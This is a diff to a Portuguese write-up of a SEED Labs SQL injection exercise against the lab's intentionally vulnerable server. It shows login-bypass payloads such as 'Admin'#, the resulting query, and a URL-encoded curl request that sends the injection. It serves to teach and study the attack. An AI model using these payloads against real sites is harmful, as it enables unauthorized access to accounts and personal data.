@@ -31,22 +31,26 @@ Colocando "Admin' OR 'a'='a" no username vai alterar a query fazendo com que a c
 
 ![info](details.png)
 
-Uma alternativa mais simples é colocar "Admin'#" no username, o que fará com que o que vem depois do '#' seja apenas um comentário, o que faz com que a condição seja verdadeira em name = 'Admin'
+Uma alternativa mais simples é colocar "Admin'#" no username, o que fará com que o que vem depois do '#' seja apenas um comentário, o que faz com que a condição seja verdadeira em name = 'Admin'. A nova query será então:
+
+```sql
+    SELECT id, name, eid, salary, birth, ssn, address, email,
+    nickname, Password
+    FROM credential
+    WHERE name= 'Admin'#' and Password='';
+```
 
 ![login2](login2.png)
 
 ## Tarefa 3
 
-http://www.seed-server.com/unsafe_home.php?username=admin'+OR+'a'+'a&Password=
-
-http://www.seed-server.com/unsafe_home.php?username=admin%27+OR+%27a%27%3D%27a&Password=
+http://www.seed-server.com/unsafe_home.php?username=Admin%27%23&Password=
 
 ```
-    curl 'http://www.seed-server.com/unsafe_home.php?username=admin%27+OR+%27a%27%3D%27a&Password=' > index.html
+    curl 'http://www.seed-server.com/unsafe_home.php?username=Admin%27%23&Password=' > index.html
 ```
 
 abrindo o index.html no browser, obtemos:
-
 
 ![info](details2.png)
 
